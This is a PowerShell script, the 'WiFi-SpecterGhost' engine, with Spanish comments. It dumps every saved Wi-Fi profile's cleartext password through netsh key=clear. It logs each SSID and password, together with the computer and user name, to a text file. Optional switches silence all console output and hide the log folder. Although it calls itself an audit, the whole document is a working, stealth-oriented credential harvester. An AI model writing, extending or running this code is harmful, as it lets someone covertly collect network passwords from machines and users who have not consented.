# --- WiFi-SpecterGhost Engine ---
# Este script es el corazon del proyecto. 100% independiente del idioma del OS.

param (
    [switch]$Silent = $false,
    [switch]$UseHiddenFolder = $false,
    [string]$OutputName = "wpsd.txt",
    [string]$FolderName = "logs"
)

# Forzar codificacion UTF-8 para evitar deformaciones en tildes y caracteres especiales
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$scriptDirectory = $PSScriptRoot
# Si el motor esta en la carpeta core, subimos un nivel para guardar los logs en la raiz
if ($scriptDirectory -match '\\core$') {
    $scriptDirectory = Split-Path -Parent $scriptDirectory
}

# --- Configuracion de rutas y nombres ---
$targetFolder = $scriptDirectory
if ($UseHiddenFolder) {
    $targetFolder = Join-Path -Path $scriptDirectory -ChildPath $FolderName
    try {
        if (-not (Test-Path -Path $targetFolder)) {
            New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
        }
        $folderItem = Get-Item -Path $targetFolder -Force
        if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
            $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
        }
    } catch { }
}

# Logica de incremento para no sobreescribir
$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
$extension = [System.IO.Path]::GetExtension($OutputName)
$finalOutputName = $OutputName
$counter = 1

while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
    $finalOutputName = "$baseName.$counter$extension"
    $counter++
}

$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName

# Escribir encabezado de metadata
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    $header = @"
=========================================
 AUDITORIA: WiFi-SpecterGhost            
 FECHA    : $timestamp                   
 EQUIPO   : $computerName                
 USUARIO  : $userName                    
=========================================
"@
    $header | Add-Content -Path $outputFilePath -Encoding UTF8
} catch { }

if (-not $Silent) { Write-Host "Iniciando escaneo de redes guardadas (Modo Universal)..." -ForegroundColor Cyan }

# Obtener perfiles - Usando regex agnostico al idioma (busca indentacion y colon)
$profilesOutput = (netsh wlan show profiles 2>$null)
# Buscamos lineas que tengan al menos 4 espacios de indentacion y contengan un ":"
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s{4,}.+:\s+(.+)$' }

if (-not $profileLines) {
    if (-not $Silent) { Write-Host "No se encontraron perfiles guardados." -ForegroundColor Yellow }
} else {
    foreach ($line in $profileLines) {
        # Extraer el nombre del perfil (lo que esta despues del ":")
        if ($line -match ':\s*(.+)$') {
            $profileName = $matches[1].Trim()
            $password = "[No encontrada]"

            try {
                # Obtener detalle con key=clear
                $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
                # Buscamos la linea que contiene la clave (independiente del idioma, buscamos el valor despues del colon en la seccion de seguridad)
                # En casi todos los idiomas, la linea de la clave es la única con ":" en la sección de seguridad que no es el nombre del perfil
                $keyLine = $profileDetailOutput | Where-Object { $_ -match ':\s+(.+)$' -and $_ -notmatch $profileName -and $_ -match '^\s{4,}' }
                
                # Para ser mas precisos, buscamos patrones comunes de 'Key Content' o 'Contenido de la clave' 
                # pero como fallback aceptamos el valor si estamos en la seccion correcta.
                # Mejor: buscamos el primer valor que aparezca despues de "Seguridad" / "Security"
                foreach ($dLine in $profileDetailOutput) {
                    if ($dLine -match ':\s*(.+)$') {
                        $val = $matches[1].Trim()
                        # Si el valor no es el nombre del perfil y estamos en una linea indentada
                        # netsh suele mostrar el "Key Content" al final de la seccion de seguridad
                        if ($dLine -match '(?:Contenido de la clave|Key Content|Clave de seguridad|Key Material|Security key|Criptografia|Authentication|Autenticacion)') {
                            if ($dLine -match '(?:Contenido de la clave|Key Content|Key Material)\s*:\s*(.+)$') {
                                $password = $matches[1].Trim()
                                break
                            }
                        }
                    }
                }
            } catch { continue }

            # Escribir al archivo
            try {
                "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
                "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
                "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
                if (-not $Silent) { Write-Host "Procesado: $profileName" -ForegroundColor Green }
            } catch { }
        }
    }
}

if (-not $Silent) { 
    Write-Host "Archivo generado: $finalOutputName" -ForegroundColor Cyan
    Write-Host "Ubicacion: $targetFolder" -ForegroundColor DarkCyan
    Write-Host "Listo! El trabajo esta hecho." -ForegroundColor Cyan
}

